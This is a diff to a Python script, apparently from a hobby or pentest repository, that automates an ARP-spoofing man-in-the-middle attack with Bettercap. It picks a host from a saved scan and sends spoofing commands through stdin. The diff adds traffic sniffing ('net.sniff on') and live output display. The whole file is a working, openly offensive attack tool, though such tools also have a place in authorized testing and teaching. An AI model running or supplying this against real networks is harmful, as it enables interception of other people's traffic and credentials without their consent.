@@ -5,7 +5,9 @@ import netifaces
 from pathlib import Path
 import sys
 import select
- 
+import threading
+import time
+
 def get_gateway_ip():
     gws = netifaces.gateways()
     default_gw = gws.get('default', {})
@@ -18,13 +20,11 @@ def load_hosts(json_file: str):
         data = json.load(f)
 
     hosts = []
-    # older/other format: "hosts"
     if data.get("hosts"):
         for host in data.get("hosts", []):
             ip = host.get("ip")
             mac = host.get("mac", "N/A")
             hosts.append((ip, mac))
-    # this repo uses "scan_parsed"
     elif data.get("scan_parsed"):
         for host in data.get("scan_parsed", []):
             ip = host.get("ip")
@@ -32,11 +32,10 @@ def load_hosts(json_file: str):
             hosts.append((ip, mac))
 
     return hosts, data
- 
+
 def delete_scan_files(prefix: Path):
     prefix = prefix.with_suffix("") 
     suffixes = [".json"]
-
     for suf in suffixes:
         f = Path(str(prefix) + suf)
         if f.exists():
@@ -46,18 +45,41 @@ def delete_scan_files(prefix: Path):
                 pass
 
 def show_menu():
-    print("=" * 50)
-    print("\n MITM Attack ")
+    print("\n" + "=" * 50)
+    print(" MITM Attack ")
     print("=" * 50)
     print("1. ARP Spoofing")
-
     print("2. Exit")
- 
+
+def output_reader(proc, stop_event, show_output):
+    while not stop_event.is_set():
+        try:
+            if proc.stdout:
+                line = proc.stdout.readline()
+                if line:
+                    if show_output.is_set():
+                        stripped = line.strip()
+                        if stripped:
+                            print(f"  {stripped}", flush=True)
+                elif proc.poll() is not None:
+                    break
+        except:
+            break
+
+def send_command(proc, cmd, delay=0.5):
+    try:
+        proc.stdin.write(cmd + "\n")
+        proc.stdin.flush()
+        time.sleep(delay)
+    except:
+        pass
 
 def run_bettercap(iface="wlan0", target_ip=None, gateway_ip=None):
     cmd = ["bettercap", "-iface", iface]
-    print(f"Starting Bettercap on interface {iface}...")
-    print("Waiting for Bettercap to start and discover hosts...")
+    
+    print(f"Starting Bettercap on {iface}...")
+    print(f"Target: {target_ip}")
+    print(f"Gateway: {gateway_ip}")
     
     proc = subprocess.Popen(
         cmd,
@@ -68,82 +90,78 @@ def run_bettercap(iface="wlan0", target_ip=None, gateway_ip=None):
         bufsize=1
     )
     
-    print("\n" + "=" * 50)
-    print("Bettercap is starting... Please wait.")
-    print("=" * 50 + "\n")
+    stop_event = threading.Event()
+    show_output = threading.Event() 
+    output_thread = threading.Thread(target=output_reader, args=(proc, stop_event, show_output), daemon=True)
+    output_thread.start()
     
-    import time
-    time.sleep(3)  
+    print("Initializing...")
+    time.sleep(2)
     
-    print("[*] Starting network probe to discover hosts...")
-    proc.stdin.write("net.probe on\n")
-    proc.stdin.flush()
+    print("Probing network...")
+    send_command(proc, "net.probe on", delay=3)
     
-    input("\n[?] Press Enter when you see the target host in Bettercap...")
-    
-    print(f"\n[*] Configuring ARP spoof for target: {target_ip}")
+    print("Configuring ARP spoof...")
+    send_command(proc, f"set arp.spoof.targets {target_ip}", delay=0.3)
     if gateway_ip:
-        print(f"[*] Gateway: {gateway_ip}")
-    
-    proc.stdin.write(f"set arp.spoof.targets {target_ip}\n")
-    proc.stdin.flush()
-    time.sleep(0.5)
-    
-    if gateway_ip:
-        proc.stdin.write(f"set arp.spoof.gateway {gateway_ip}\n")
-        proc.stdin.flush()
-        time.sleep(0.5)
-    
-    proc.stdin.write("set arp.spoof.fullduplex true\n")
-    proc.stdin.flush()
-    time.sleep(0.5)
-    
-    print("[*] Starting ARP spoofing...")
-    proc.stdin.write("arp.spoof on\n")
-    proc.stdin.flush()
+        send_command(proc, f"set arp.spoof.gateway {gateway_ip}", delay=0.3)
+    send_command(proc, "set arp.spoof.fullduplex true", delay=0.3)
     
     print("\n" + "=" * 50)
-    print("ARP Spoofing is now ACTIVE!")
-    print("Press Enter to stop the attack...")
-    print("=" * 50 + "\n")
+    print(" ARP SPOOFING + SNIFFING ACTIVE")
+    print("=" * 50)
+    
+    show_output.set()  
+
+    send_command(proc, "arp.spoof on", delay=0.5)
+    send_command(proc, "net.sniff on", delay=0.5)
+    
+    print("Press Enter to stop...")
     
     try:
-        while True:
+        while proc.poll() is None:
             rlist, _, _ = select.select([sys.stdin], [], [], 0.5)
             if rlist:
-                _ = sys.stdin.readline()
-                print("\n[*] Stopping ARP spoofing...")
-                proc.stdin.write("arp.spoof off\n")
-                proc.stdin.flush()
-                time.sleep(1)
-                proc.stdin.write("exit\n")
-                proc.stdin.flush()
-                try:
-                    proc.wait(timeout=5)
-                except subprocess.TimeoutExpired:
-                    proc.terminate()
-                    proc.wait(timeout=3)
+                sys.stdin.readline()
                 break
     except KeyboardInterrupt:
-        print("\n[*] Interrupted! Stopping ARP spoofing...")
-        proc.stdin.write("arp.spoof off\n")
-        proc.stdin.flush()
-        time.sleep(1)
-        proc.stdin.write("exit\n")
-        proc.stdin.flush()
-        try:
-            proc.wait(timeout=5)
-        except subprocess.TimeoutExpired:
-            proc.terminate()
-            proc.wait(timeout=3)
+        pass
+    
+    show_output.clear()
+    print("\nStopping attack...")
+    send_command(proc, "arp.spoof off", delay=0.1)
+    send_command(proc, "net.sniff off", delay=0.1)
+    send_command(proc, "net.probe off", delay=0.1)
+    send_command(proc, "exit", delay=0.1)
+    
+    stop_event.set()
+    try:
+        proc.wait(timeout=3)
+    except subprocess.TimeoutExpired:
+        proc.terminate()
+        proc.wait(timeout=2)
+    
+    print("Attack stopped successfully")
 
 
 
 def main():
+   
+    try:
+        hosts, data = load_hosts("scan_result.json")
+    except FileNotFoundError:
+        print("Error: scan_result.json not found. Run a scan first.")
+        return
+    except json.JSONDecodeError:
+        print("Error: Invalid JSON in scan_result.json")
+        return
 
-    hosts, data = load_hosts("scan_result.json")
+    if not hosts:
+        print("No hosts found in scan results.")
+        return
 
     default_iface = data.get("iface", "wlan0")
+    gateway_ip = get_gateway_ip()
 
     print("Hosts discovered:")
     for i, (ip, mac) in enumerate(hosts, 1):
@@ -151,8 +169,7 @@ def main():
 
     while True:
         try:
-            choice_raw = input("Select the host to attack (number): ")
-            choice = int(choice_raw)
+            choice = int(input("Select the host to attack (number): "))
             if 1 <= choice <= len(hosts):
                 break
             print(f"Choose a number between 1 and {len(hosts)}.")
@@ -160,7 +177,9 @@ def main():
             print("Enter a valid number.")
 
     target_ip = hosts[choice-1][0]
-    gateway_ip = get_gateway_ip()
+    target_mac = hosts[choice-1][1]
+    
+    print(f"Target: {target_ip} ({target_mac})")
 
     while True:
         show_menu()
